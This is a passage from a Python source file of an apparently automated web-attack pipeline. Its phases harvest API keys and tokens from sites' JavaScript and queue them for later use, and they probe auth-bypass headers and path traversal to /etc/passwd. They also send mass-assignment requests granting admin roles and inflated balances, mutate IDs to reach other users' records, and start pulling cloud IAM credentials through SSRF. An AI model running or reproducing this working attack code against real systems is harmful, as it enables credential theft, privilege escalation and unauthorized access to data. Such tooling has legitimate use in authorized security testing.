                    resolved_ips.add(ip)
        if resolved_ips:
            cf_ips: Set[str] = set()
            non_cf_ips: Set[str] = set()
            for ip in sorted(resolved_ips)[:_PIPELINE_CFG.sample_hosts_origin]:
                if ip in ipcache_data:
                    info_data = ipcache_data[ip]
                else:
                    try:
                        _j_ip_hdr = {"User-Agent": "Mozilla/5.0"}
                        _j_ip_hdr.update(_j_extra_headers)
                        req = urllib.request.Request(
                            f"https://ipinfo.io/{ip}/json", headers=_j_ip_hdr
                        )
                        _, _, ip_info_bytes = await _async_urlopen(_j_urlopen, req, timeout=10)
                        info = ip_info_bytes.decode("utf-8", errors="ignore")
                        info_data = json.loads(info)
                        ipcache_data[ip] = info_data
                    except Exception:
                        findings.append(
                            f"  unresolved_ip={ip} (check manually)"
                        )
                        continue
                org = (info_data.get("org") or "").lower()
                if "cloudflare" in org or "13335" in org:
                    cf_ips.add(ip)
                else:
                    non_cf_ips.add(ip)
                    findings.append(
                        f"  non_cloudflare_ip={ip}  org={info_data.get('org', 'unknown')}"
                    )
            if ipcache_data:
                ipcache.write_text(json.dumps(ipcache_data, indent=2))
            if cf_ips:
                findings.append(f"  cloudflare_ips={', '.join(sorted(cf_ips))}")
            if non_cf_ips:
                findings.append(f"  non_cloudflare_candidates={', '.join(sorted(non_cf_ips))}")
    out = ensure(outdir / "origin.txt")
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"14-ORIGIN: {len(findings)} origin findings → {out}")
    return {"14-ORIGIN": str(out), "count": len(findings)}


# ──────────────────── Phase 15-SECRETS: deep JS secret scanning ──────────────────────
_JS_SECRET_PATTERNS: List[Tuple[str, str]] = [
    ("firebase", r"AIza[0-9A-Za-z\-_]{35}"),
    ("stripe-live", r"(?:sk|pk)_live_[0-9A-Za-z]{24,}"),
    ("stripe-test", r"(?:sk|pk)_test_[0-9A-Za-z]{24,}"),
    ("github-tok", r"gh[opsu]_[0-9A-Za-z]{36,}"),
    ("aws-key", r"AKIA[0-9A-Z]{16}"),
    ("aws-secret", r"(?i)aws(.{0,20})?(?:secret|key).{0,20}[\"'][0-9a-zA-Z\/+=]{40}[\"']"),
    ("google-oauth", r"[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com"),
    ("slack-tok", r"xox[baprs]-[0-9A-Za-z\-]{10,}"),
    ("jwt", r"eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}"),
    ("heroku", r"https://api\.heroku\.com"),
    ("graphql", r"(graphql|gql)\s*[=:]\s*[\"']https?://"),
    ("s3-bucket", r"(?:bucket|asset|media|uploads|backup|files|cdn|static)\.(?:s3\.amazonaws\.com|s3-[a-z0-9-]+\.amazonaws\.com)"),
    ("process-env", r"process\.env\.(?:SECRET|TOKEN|KEY|PASSWORD|API_KEY|ACCESS_KEY|SECRET_KEY)"),
    ("json-secret-key", r"""(?i)(?:api[_-]?key|secret|token|password|passwd)\s*[:=]\s*["'`][A-Za-z0-9_\-/=+]{16,}["'`]"""),
    (
        "internal-ip",
        r"(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})",
    ),
    (
        "internal-host",
        r"(?i)(?:internal|private|staging|dev|jenkins|gitlab|jira|confluence)\.(?:com|local|internal|corp)",
    ),
]
_SOURCE_MAP_RE = re.compile(r'(?://#\s*sourceMappingURL=|sourceMappingURL=)([^\s"\']+)', re.IGNORECASE)


async def phase_15_SECRETS(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False) -> Dict[str, Any]:
    if skip & {"15-SECRETS"}:
        return {}
    _k_out = outdir / "js_secrets_deep.txt"
    if _k_out.exists() and not force:
        return {"15-SECRETS": str(_k_out), "count": count_nonblank(_k_out)}
    log("info", "Phase 15-SECRETS: deep JS secret scanning (custom regex + entropy + source maps)")
    _k_extra_headers = _extra_headers_dict()
    _k_urlopen = _get_urlopener()
    js_urls = outdir / "urls_js.txt"
    if not js_urls.exists() or not read_lines(js_urls):
        await asyncio.sleep(3)
    if not js_urls.exists() or not read_lines(js_urls):
        log("info", "15-SECRETS: no JS URLs; skipping")
        return {"15-SECRETS": str(outdir / "js_secrets_deep.txt"), "count": 0}
    findings: List[str] = []
    seen_secrets: Set[str] = set()
    seen_sourcemaps: Set[str] = set()
    # unfurl URL component extraction from JS URLs (extracts paths, keys, values)
    if t.has("unfurl"):
        unfurl_out = outdir / "unfurled_urls.txt"
        runner = outdir / "logs" / "unfurl_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"IN={shlex.quote(str(js_urls))}\n"
            f"OUT={shlex.quote(str(unfurl_out))}\n"
            'cat "$IN" | unfurl paths >> "$OUT" 2>/dev/null\n'
            'cat "$IN" | unfurl keys >> "$OUT" 2>/dev/null\n'
            'cat "$IN" | unfurl values >> "$OUT" 2>/dev/null || true\n'
        )
        runner.chmod(0o755)
        unfurl_jobs: List[Tuple[str, List[str], int]] = []
        unfurl_jobs.append(("unfurl", ["bash", str(runner)], 300))
        await run_parallel(unfurl_jobs, outdir)
        if unfurl_out.exists() and read_lines(unfurl_out):
            deduped = set(read_lines(unfurl_out))
            unfurl_out.write_text("\n".join(sorted(deduped)) + "\n")
            merge_unique(
                [outdir / "urls_all.txt", unfurl_out],
                outdir / "urls_all.txt",
            )
    for js_url in read_lines(js_urls):
        try:
            _k_hdr = {"User-Agent": "Mozilla/5.0"}
            _k_hdr.update(_k_extra_headers)
            req = urllib.request.Request(js_url, headers=_k_hdr)
            _, _, body_bytes = await _async_urlopen(_k_urlopen, req, timeout=15)
            body = body_bytes.decode("utf-8", errors="ignore")
        except Exception:
            continue
        # Save raw JS file for gitleaks scanning
        js_raw = ensure(outdir / f"js_raw_{safe_suffix(js_url)}.js")
        js_raw.write_text(body)
        # Custom regex patterns
        for name, pattern in _JS_SECRET_PATTERNS:
            for m in re.finditer(pattern, body):
                val = m.group()
                if val not in seen_secrets:
                    seen_secrets.add(val)
                    findings.append(f"[{name}] {val}  ({js_url})")
        # Shannon-entropy scan for high-entropy strings (likely API keys /
        # secrets not caught by regex). Look for base64-ish strings of 32+ chars.
        for m in re.finditer(r"[\"']([A-Za-z0-9+/=]{40,})[\"']", body):
            val = m.group(1)
            if val in seen_secrets:
                continue
            # Shannon entropy > 4.5 suggests random-looking secret
            freq: Dict[str, int] = {}
            for c in val:
                freq[c] = freq.get(c, 0) + 1
            entropy = 0.0
            for f in freq.values():
                p = f / len(val)
                entropy -= p * math.log2(p)
            if entropy > 4.5:
                seen_secrets.add(val)
                findings.append(f"[high-entropy] {val[:60]}… (entropy={entropy:.2f})  ({js_url})")
    # Source maps
        for m in _SOURCE_MAP_RE.finditer(body):
            sm_url = m.group(1)
            if not sm_url.startswith("http"):
                base = js_url.rsplit("/", 1)[0]
                sm_url = base.rstrip("/") + "/" + sm_url.lstrip("/")
            sm_entry = f"[sourcemap] {sm_url}  ({js_url})"
            if sm_url in seen_sourcemaps:
                continue
            seen_sourcemaps.add(sm_url)
            findings.append(sm_entry)
            try:
                _k_sm_hdr = {"User-Agent": "Mozilla/5.0"}
                _k_sm_hdr.update(_k_extra_headers)
                sm_req = urllib.request.Request(sm_url, headers=_k_sm_hdr)
                _, _, sm_body_bytes = await _async_urlopen(_k_urlopen, sm_req, timeout=15)
                sm_body = sm_body_bytes.decode("utf-8", errors="ignore")
                sm_data = json.loads(sm_body)
                sources = sm_data.get("sources") or []
                for src in sources:
                    if isinstance(src, str):
                        for name2, pattern2 in _JS_SECRET_PATTERNS:
                            for m2 in re.finditer(pattern2, src):
                                val2 = m2.group()
                                if val2 not in seen_secrets:
                                    seen_secrets.add(val2)
                                    findings.append(f"  [sourcemap-{name2}] {val2}")
            except Exception:
                continue
    # gitleaks scan on downloaded JS files for secret patterns
    # trufflehog scan on downloaded JS files
    if t.has("trufflehog"):
        if list(outdir.glob("js_raw_*.js")):
            truffle_jobs: List[Tuple[str, List[str], int]] = []
            for jf in sorted(outdir.glob("js_raw_*.js")):
                truffle_out = outdir / f"trufflehog_{safe_suffix(jf.name)}.txt"
                truffle_runner = outdir / "logs" / f"trufflehog_{safe_suffix(jf.name)}.sh"
                ensure(truffle_runner)
                truffle_runner.write_text(
                    "#!/usr/bin/env bash\n"
                    "set -eu\n"
                    f"IN={shlex.quote(str(jf))}\n"
                    f"OUT={shlex.quote(str(truffle_out))}\n"
                    'trufflehog filesystem "$IN" --no-verification 2>/dev/null > "$OUT" || true\n'
                )
                truffle_runner.chmod(0o755)
                truffle_jobs.append((
                    f"trufflehog-{safe_suffix(jf.name)[:16]}",
                    ["bash", str(truffle_runner)],
                    300,
                ))
            if truffle_jobs:
                await run_parallel(truffle_jobs, outdir)
                for tfp in sorted(outdir.glob("trufflehog_*.txt")):
                    if tfp.exists() and read_lines(tfp):
                        for ln in read_lines(tfp):
                            findings.append(f"  [trufflehog] {ln}")
    if t.has("gitleaks"):
        if list(outdir.glob("js_raw_*.js")):
            gitleaks_jobs: List[Tuple[str, List[str], int]] = []
            for jf in sorted(outdir.glob("js_raw_*.js")):
                safe = safe_suffix(jf.name)
                gl_out = outdir / f"gitleaks_{safe}.json"
                gitleaks_jobs.append(
                    (
                        f"gitleaks-{safe[:16]}",
                        [
                            "gitleaks", "detect",
                            "--source", str(jf),
                            "--report-format", "json",
                            "--report-path", str(gl_out),
                            "--no-git",
                            "-v",
                        ],
                        300,
                    )
                )
            if gitleaks_jobs:
                await run_parallel(gitleaks_jobs, outdir)
                for glp in sorted(outdir.glob("gitleaks_*.json")):
                    try:
                        gl_data = json.loads(glp.read_text(encoding="utf-8", errors="ignore"))
                        if isinstance(gl_data, list):
                            for item in gl_data:
                                desc = item.get("description", "secret")
                                fname = item.get("file", "")
                                line = item.get("startLine", "")
                                match = item.get("match", "")[:80]
                                findings.append(
                                    f"  [gitleaks] {desc} in {fname}:{line} {match}"
                                )
                        elif isinstance(gl_data, dict) and gl_data.get("Findings"):
                            for item in gl_data["Findings"]:
                                findings.append(
                                    f"  [gitleaks] {item.get('Description','secret')} "
                                    f"in {item.get('File','')}:{item.get('StartLine','')} "
                                    f"{item.get('Match','')[:80]}"
                                )
                    except (json.JSONDecodeError, ValueError):
                        continue
    out = ensure(outdir / "js_secrets_deep.txt")
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    # Clean up raw JS and intermediate gitleaks files
    for p in outdir.glob("js_raw_*.js"):
        p.unlink(missing_ok=True)
    for p in outdir.glob("gitleaks_*.json"):
        p.unlink(missing_ok=True)
    for p in outdir.glob("trufflehog_*.txt"):
        p.unlink(missing_ok=True)
    log("ok", f"15-SECRETS: {len(findings)} deep JS findings → {out}")
    # Push found credentials into the shared credential queue for downstream phases
    cred_patterns = re.compile(r"(?i)(api[_-]?key|secret|token|password|jwt|bearer|auth)", re.IGNORECASE)
    for f in findings:
        if cred_patterns.search(f):
            _PIPELINE_CFG.credentials_queue.append(f)
    if _PIPELINE_CFG.credentials_queue:
        log("info", f"15-SECRETS: {len(_PIPELINE_CFG.credentials_queue)} potential credentials added to testing queue")
    return {"15-SECRETS": str(out), "count": len(findings)}


# ─────────────── Phase 16-AUTHZ: auth bypass + mass assignment ─────────────────────
_AUTH_BYPASS_HEADERS = [
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Host",
    "X-Forwarded-Scheme",
    "X-Real-IP",
    "Client-IP",
    "X-Custom-IP-Authorization",
    "X-Auth-Token",
    "X-Auth-User",
    "Authorization: Basic YWRtaW46YWRtaW4=",
]
_AUTH_METHOD_OVERRIDE_HEADERS = [
    "X-HTTP-Method-Override",
    "X-HTTP-Method",
    "X-Method-Override",
    "X-HTTP-Method-Override: POST",
    "X-HTTP-Method-Override: PUT",
    "X-HTTP-Method-Override: PATCH",
    "X-HTTP-Method-Override: DELETE",
]
_MASS_ASSIGN_FIELDS = [
    "admin",
    "is_admin",
    "role",
    "roles",
    "permissions",
    "is_teacher",
    "is_student",
    "group",
    "user_type",
    "balance",
    "points",
    "score",
    "grade",
    "completed",
    "approved",
    "verified",
    "active",
    "enabled",
    "plan",
    "tier",
    "subscription",
]


async def phase_16A_AUTHZ(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False) -> Dict[str, Any]:
    if skip & {"16A-AUTHZ"}:
        return {}
    _l_out = outdir / "authz_bypass.txt"
    if _l_out.exists() and not force:
        return {"16A-AUTHZ": str(_l_out), "count": count_nonblank(_l_out)}
    log("info", "Phase 16A-AUTHZ: auth bypass headers + method override + CORS checks")
    findings: List[str] = []
    _l_urlopen = _get_urlopener()
    # 1. Collect API-like endpoints from urls_all.txt + ffuf output
    urls = outdir / "urls_all.txt"
    api_endpoints: Set[str] = set()
    if urls.exists():
        for u in _dedupe_by_host_path(read_lines(urls)):
            path = u.split("?")[0].split("#")[0].lower()
            if "/api/" in path or path.endswith(
                (
                    "/api",
                    "/account",
                    "/login",
                    "/register",
                    "/password",
                    "/user",
                    "/admin",
                    "/graphql",
                )
            ):
                api_endpoints.add(u)
    # Also check ffuf output for 200/301/302/403 endpoints
    for ff in outdir.glob("ffuf_*.txt"):
        if ff.exists() and ff.name != "fuzz.txt":
            for ln in read_lines(ff):
                parts = ln.split("\t", 1)
                if len(parts) == 2:
                    api_endpoints.add(parts[1])
    if not api_endpoints:
        # Fall back to first 10 urls
        api_endpoints = set(read_lines(urls)[:_PIPELINE_CFG.sample_endpoints_l]) if urls.exists() else set()
    if not api_endpoints:
        log("warn", "16A-AUTHZ: no endpoints found; skipping")
        return {"16A-AUTHZ": str(outdir / "authz_bypass.txt"), "count": 0}
    findings.append(f"target_endpoints={len(api_endpoints)}")
    for ep in sorted(api_endpoints)[:_PIPELINE_CFG.sample_endpoints_l]:
        findings.append(f"  endpoint={ep}")
    # 2. qsreplace parameter pollution testing
    if t.has("qsreplace") and sorted(api_endpoints)[:_PIPELINE_CFG.sample_endpoints_l]:
        qsreplace_in = ensure(outdir / "urls_qsreplace.txt")
        qsreplace_in.write_text(
            "\n".join(sorted(api_endpoints)[:_PIPELINE_CFG.sample_endpoints_l]) + "\n"
        )
        qsreplace_out = outdir / "qsreplace_results.txt"
        runner = outdir / "logs" / "qsreplace_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"IN={shlex.quote(str(qsreplace_in))}\n"
            f"OUT={shlex.quote(str(qsreplace_out))}\n"
            'cat "$IN" | qsreplace "evil" > "$OUT" 2>/dev/null || true\n'
        )
        runner.chmod(0o755)
        await _run(
            "qsreplace",
            ["bash", str(runner)],
            300, outdir,
        )
        if qsreplace_out.exists() and read_lines(qsreplace_out):
            for ln in read_lines(qsreplace_out)[:20]:
                findings.append(f"  [qsreplace] {ln}")
    # 3. Auth bypass header probes (non-destructive, concurrent)
    bypass_found: List[str] = []
    targets = sorted(api_endpoints)[:_PIPELINE_CFG.sample_endpoints_l]

    async def _check_bypass(ep: str) -> List[str]:
        results: List[str] = []
        try:
            base_req = urllib.request.Request(ep, method="GET")
            baseline_status, _, baseline_body = await _async_urlopen(_l_urlopen, base_req, timeout=8)
            baseline_len = len(baseline_body)
        except Exception:
            return results
        for hdr in _AUTH_BYPASS_HEADERS:
            await _throttle_rate()
            try:
                req = urllib.request.Request(ep, method="GET")
                if ":" in hdr:
                    k, v = hdr.split(":", 1)
                    req.add_header(k.strip(), v.strip())
                elif hdr in ("X-Original-URL", "X-Rewrite-URL"):
                    req.add_header(hdr, "/admin")
                elif hdr in ("X-Auth-Token", "X-Auth-User"):
                    req.add_header(hdr, "admin")
                elif hdr == "X-Custom-IP-Authorization":
                    req.add_header(hdr, "127.0.0.1")
                elif hdr == "Authorization: Basic YWRtaW46YWRtaW4=":
                    req.add_header("Authorization", "Basic YWRtaW46YWRtaW4=")
                else:
                    req.add_header(hdr, "127.0.0.1")
                probe_status, _, probe_body = await _async_urlopen(_l_urlopen, req, timeout=8)
                probe_len = len(probe_body)
                # Different status code → potential bypass
                if probe_status != baseline_status and probe_status in (200, 302, 403, 401):
                    results.append(
                        f"  bypass={hdr} → {probe_status} (baseline={baseline_status}) on {ep}"
                    )
                    break
                # Same status code but significantly different body length → may indicate
                # different content being served (e.g. admin panel vs login page)
                if (probe_status == baseline_status
                        and probe_len
                        and abs(probe_len - baseline_len) > max(100, baseline_len * 0.1)):
                    results.append(
                        f"  bypass_body_diff={hdr} (status={probe_status}, len={probe_len}, baseline_len={baseline_len}) on {ep}"
                    )
            except Exception:
                continue
        return results

    bypass_results = await asyncio.gather(*[_check_bypass(ep) for ep in targets])
    for br in bypass_results:
        bypass_found.extend(br)

    # 3a. HTTP method override probes (concurrent)
    method_override_findings: List[str] = []
    async def _check_method_override(ep: str) -> List[str]:
        results: List[str] = []
        for ohdr in _AUTH_METHOD_OVERRIDE_HEADERS:
            await _throttle_rate()
            try:
                req = urllib.request.Request(ep, method="GET",
                    headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"})
                if ":" in ohdr:
                    k, v = ohdr.split(":", 1)
                    req.add_header(k.strip(), v.strip())
                else:
                    req.add_header(ohdr, "POST")
                override_status, _, _ = await _async_urlopen(_l_urlopen, req, timeout=8)
                if override_status in (200, 201, 302, 403, 405, 500):
                    results.append(f"  method_override={ohdr} → {override_status} on {ep}")
            except Exception:
                continue
        return results
    mo_results = await asyncio.gather(*[_check_method_override(ep) for ep in targets])
    for mr in mo_results:
        method_override_findings.extend(mr)

    # 3b. X-Original-URL path traversal probes
    xou_findings: List[str] = []
    async def _check_xou_traversal(ep: str) -> List[str]:
        results: List[str] = []
        for path in ["/admin", "/../admin", "/%2e%2e/admin", "/..;/admin", "/../../etc/passwd"]:
            await _throttle_rate()
            try:
                req = urllib.request.Request(ep, method="GET",
                    headers={"User-Agent": "Mozilla/5.0", "X-Original-URL": path})
                xou_status, _, xou_body = await _async_urlopen(_l_urlopen, req, timeout=8)
                if xou_status in (200, 201, 302, 403):
                    results.append(f"  xou_traversal=X-Original-URL: {path} → {xou_status} on {ep}")
            except Exception:
                continue
        return results
    xou_results = await asyncio.gather(*[_check_xou_traversal(ep) for ep in targets])
    for xr in xou_results:
        xou_findings.extend(xr)

    findings.append("auth_bypass_probes:")
    findings.extend(bypass_found or ["  none detected (expected)"])
    if method_override_findings:
        findings.append("method_override_probes:")
        findings.extend(method_override_findings)
    if xou_findings:
        findings.append("xou_traversal_probes:")
        findings.extend(xou_findings)
    # 4. Basic CORS misconfiguration check (origin reflection)
    cors_findings: List[str] = []

    async def _check_cors(ep: str) -> Optional[str]:
        try:
            req = urllib.request.Request(ep, method="GET")
            req.add_header("Origin", "https://evil.example.com")
            _, cors_headers, _ = await _async_urlopen(_l_urlopen, req, timeout=8)
            acao = cors_headers.get("Access-Control-Allow-Origin", "")
            acac = cors_headers.get("Access-Control-Allow-Credentials", "")
            if "*" in acao or "evil.example.com" in acao:
                return f"  cors_origin_reflection=YES (ACAO={acao}, ACAC={acac}) on {ep}"
        except Exception:
            pass
        return None

    cors_results = await asyncio.gather(*[_check_cors(ep) for ep in targets[:_PIPELINE_CFG.sample_endpoints_cors]])
    for r in cors_results:
        if r:
            cors_findings.append(r)
    if cors_findings:
        findings.append("cors_checks:")
        findings.extend(cors_findings)
    out = ensure(outdir / "authz_bypass.txt")
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"16A-AUTHZ: {len(findings)} auth bypass findings → {out}")
    return {"16A-AUTHZ": str(out), "count": len(findings)}


async def phase_16B_MASSASSIGN(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"16B-MASSASSIGN"}:
        return {}
    _out = outdir / "mass_assign.txt"
    if _out.exists() and not force:
        return {"16B-MASSASSIGN": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 16B-MASSASSIGN: mass assignment probes via POST/PUT")
    findings: List[str] = []
    _ma_urlopen = _get_urlopener()
    urls = outdir / "urls_all.txt"
    api_endpoints: Set[str] = set()
    if urls.exists():
        for u in _dedupe_by_host_path(read_lines(urls)):
            path = u.split("?")[0].split("#")[0].lower()
            if "/api/" in path or path.endswith(
                ("/api", "/account", "/login", "/register", "/password", "/user", "/admin", "/graphql")
            ):
                api_endpoints.add(u)
    for ff in outdir.glob("ffuf_*.txt"):
        if ff.exists() and ff.name != "fuzz.txt":
            for ln in read_lines(ff):
                parts = ln.split("\t", 1)
                if len(parts) == 2:
                    api_endpoints.add(parts[1])
    if not api_endpoints:
        api_endpoints = set(read_lines(urls)[:_PIPELINE_CFG.sample_endpoints_l]) if urls.exists() else set()
    if not api_endpoints:
        log("warn", "16B-MASSASSIGN: no endpoints found; skipping")
        return {"16B-MASSASSIGN": str(_out), "count": 0}
    findings.append(f"target_endpoints={len(api_endpoints)}")
    _MASS_ASSIGN_VALUES: Dict[str, object] = {
        "admin": True, "is_admin": True, "role": "admin", "roles": ["admin"],
        "permissions": ["admin"], "is_teacher": True, "is_student": True,
        "group": "admin", "user_type": "admin", "plan": "enterprise", "tier": "premium",
        "subscription": "premium", "balance": 999999, "points": 999999,
        "score": 999999, "grade": "A+", "completed": True, "approved": True,
        "verified": True, "active": True, "enabled": True,
    }
    post_targets = [ep for ep in sorted(api_endpoints)[:_PIPELINE_CFG.sample_endpoints_post] if "?" not in ep.split("#")[0]]

    async def _check_mass_assignment(ep: str) -> List[str]:
        results: List[str] = []
        for field in _MASS_ASSIGN_FIELDS[:_PIPELINE_CFG.sample_endpoints_post]:
            await _throttle_rate()
            val = _MASS_ASSIGN_VALUES.get(field, True)
            body = json.dumps({field: val}).encode()
            try:
                req = urllib.request.Request(ep, data=body, method="POST",
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
                post_status, _, _ = await _async_urlopen(_ma_urlopen, req, timeout=8)
                if post_status in (200, 201, 302):
                    results.append(f"  POST {ep} {{{field}: {json.dumps(val)}}} → {post_status}")
            except Exception:
                continue
        return results

    async def _check_mass_assignment_put(ep: str) -> List[str]:
        results: List[str] = []
        for field in _MASS_ASSIGN_FIELDS[:_PIPELINE_CFG.sample_endpoints_post]:
            await _throttle_rate()
            val = _MASS_ASSIGN_VALUES.get(field, True)
            body = json.dumps({field: val}).encode()
            try:
                req = urllib.request.Request(ep, data=body, method="PUT",
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
                put_status, _, _ = await _async_urlopen(_ma_urlopen, req, timeout=8)
                if put_status in (200, 201, 302):
                    results.append(f"  PUT {ep} {{{field}: {json.dumps(val)}}} → {put_status}")
            except Exception:
                continue
        return results

    post_results = await asyncio.gather(*[_check_mass_assignment(ep) for ep in post_targets])
    for pr in post_results:
        findings.extend(pr)
    put_results = await asyncio.gather(*[_check_mass_assignment_put(ep) for ep in post_targets])
    for pr in put_results:
        findings.extend(pr)
    if not findings or len(findings) == 1:
        findings.append("[result] No mass assignment vulnerabilities detected")
    findings.append("mass_assignment_fields_tested:")
    findings.extend([f"  {f}" for f in _MASS_ASSIGN_FIELDS])
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"16B-MASSASSIGN: {len(findings)} findings → {out}")
    return {"16B-MASSASSIGN": str(_out), "count": len(findings)}


async def phase_17_IDOR(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"17-IDOR"}:
        return {}
    _out = outdir / "idor.txt"
    if _out.exists() and not force:
        return {"17-IDOR": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 17-IDOR: systematic ID manipulation testing")
    findings: List[str] = []
    _id_urlopen = _get_urlopener()
    _id_extra_headers = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    params_file = outdir / "params.txt"
    all_urls: List[str] = []
    if urls_file.exists():
        all_urls = read_lines(urls_file)
    if params_file.exists():
        all_urls.extend(read_lines(params_file))
    all_urls = _dedupe_by_host_path(all_urls)
    if not all_urls:
        log("warn", "17-IDOR: no URLs or params available; skipping")
        return {"17-IDOR": str(_out), "count": 0}
    # Identify ID-bearing parameters
    id_params = ["id", "user_id", "account_id", "customer_id", "profile_id",
                 "uid", "uuid", "guid", "token", "reference", "order_id",
                 "transaction_id", "invoice_id", "document_id", "file_id",
                 "app_id", "org_id", "group_id", "role_id", "permission_id"]
    id_urls = [u for u in all_urls if any(p + "=" in u.lower() for p in id_params)][:_PIPELINE_CFG.sample_urls_idor]
    if not id_urls:
        # Fall back to any param-bearing URLs
        id_urls = [u for u in all_urls if "=" in u][:_PIPELINE_CFG.sample_urls_idor]
    if not id_urls:
        log("warn", "17-IDOR: no parameter-bearing URLs; skipping")
        return {"17-IDOR": str(_out), "count": 0}
    findings.append(f"target_urls={len(id_urls)}")
    # Helper to switch UUIDs between test accounts
    known_uuids = ["00000000-0000-0000-0000-000000000000",
                   "11111111-1111-1111-1111-111111111111",
                   "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa"]
    async def _probe_idor(url: str) -> List[str]:
        results: List[str] = []
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            return results
        # Baseline request
        try:
            base_req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_id_extra_headers})
            base_status, _, base_body = await _async_urlopen(_id_urlopen, base_req, timeout=10)
            base_len = len(base_body)
        except Exception:
            return results
        for pname in qs:
            if not any(idp in pname.lower() for idp in ["id", "uid", "uuid", "account", "user", "customer", "profile"]):
                continue
            orig_val = qs[pname][0]
            mutations: List[str] = []
            # Numeric increment/decrement
            if orig_val.isdigit():
                mutations.append(str(int(orig_val) + 1))
                mutations.append(str(max(0, int(orig_val) - 1)))
                mutations.append("1")
                mutations.append("999999")
            elif len(orig_val) == 36 and orig_val.count("-") == 4:
                # Looks like a UUID: try known UUIDs
                mutations.extend(known_uuids)
                # Try swapping first group
                parts = orig_val.split("-")
                if len(parts) == 5:
                    mutations.append("-".join(["00000000"] + parts[1:]))
                    mutations.append("-".join(["11111111"] + parts[1:]))
            # Sequential/predictable mutations
            mutations.append("0")
            mutations.append("1")
            mutations.append("-1")
            # Deduplicate to avoid sending the same mutation twice
            mutations = list(dict.fromkeys(mutations))
            for mutation in mutations[:_PIPELINE_CFG.sample_endpoints_post]:
                await _throttle_rate()
                test_qs = qs.copy()
                test_qs[pname] = [mutation]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_id_extra_headers})
                    test_status, _, test_body = await _async_urlopen(_id_urlopen, req, timeout=10)
                    test_len = len(test_body)
                    # IDOR indicators: same status as baseline but different content,
                    # or status 200 when baseline was 403/401 (unauthorized access)
                    if test_status == 200 and base_status in (401, 403):
                        results.append(f"[idor] {test_url} → HTTP {test_status} (baseline={base_status}) — privilege escalation")
                    elif test_status == base_status and test_len > 0 and base_len > 0 and abs(test_len - base_len) > max(200, base_len * 0.2):
                        results.append(f"[idor-candidate] {test_url} → HTTP {test_status} len={test_len} (baseline={base_status}/{base_len})")
                except Exception:
                    continue
        return results
    probe_results = await asyncio.gather(*[_probe_idor(u) for u in id_urls])
    for pr in probe_results:
        findings.extend(pr)
    if not findings:
        findings.append("[result] No IDOR vulnerabilities detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"17-IDOR: {len(findings)} findings → {out}")
    return {"17-IDOR": str(_out), "count": len(findings)}


async def phase_17b_SSRFMETA(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"17B-SSRFMETA"}:
        return {}
    _out = outdir / "ssrf_meta.txt"
    if _out.exists() and not force:
        return {"17B-SSRFMETA": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 17b-SSRFMETA: cloud metadata exfiltration via confirmed SSRF")
    findings: List[str] = []
    _ss_urlopen = _get_urlopener()
    _ss_extra_headers = _extra_headers_dict()
    # Read SSRF candidates from vulns.txt and url_ssrf.txt
    vulns_file = outdir / "vulns.txt"
    ssrf_urls_file = outdir / "urls_ssrf.txt"
    ssrf_candidates: List[str] = []
    if vulns_file.exists():
        for ln in read_lines(vulns_file):
            if "ssrf" in ln.lower():
                # Extract URL from line
                for token in ln.split():
                    if token.startswith("http"):
                        ssrf_candidates.append(token)
                        break
    if ssrf_urls_file.exists():
        ssrf_candidates.extend(read_lines(ssrf_urls_file))
    ssrf_candidates = _dedupe_by_host_path(ssrf_candidates)
    if not ssrf_candidates:
        log("warn", "17b-SSRFMETA: no SSRF candidates found; skipping")
        return {"17B-SSRFMETA": str(_out), "count": 0}
    findings.append(f"ssrf_candidates={len(ssrf_candidates)}")
    # Cloud metadata IPs and paths
    cloud_targets = [
        # AWS
        ("AWS", "http://169.254.169.254/latest/meta-data/"),
        ("AWS", "http://169.254.169.254/latest/user-data/"),
        ("AWS", "http://169.254.169.254/latest/credentials/"),
        ("AWS", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        # GCP
        ("GCP", "http://169.254.169.254/computeMetadata/v1/"),
        ("GCP", "http://metadata.google.internal/computeMetadata/v1/"),
        ("GCP", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
        # Azure
        ("Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
